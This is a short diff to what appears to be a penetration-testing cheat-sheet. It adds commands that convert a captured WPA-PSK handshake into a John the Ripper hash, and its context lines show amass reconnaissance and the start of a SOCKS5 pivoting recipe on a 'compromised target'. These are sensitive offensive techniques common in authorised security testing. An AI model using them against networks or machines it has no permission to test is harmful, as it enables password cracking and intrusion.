@@ -85,6 +85,12 @@ amass -v -whois -ip -active -brute -d example.com
 
 
 
+# convert WPA-PSK captured handshake to hash (suitable for John The Ripper)
+/usr/lib/hashcat-utils/cap2hccapx.bin file.cap file.hccapx
+hccap2john file.hccapx >> hashes.txt
+
+
+
 # pivoting by executing a SOCKS5 server on a compromised target and forwarding the local port remotely via SSH
 # -> on your attacking machine:
 TARGET=victim
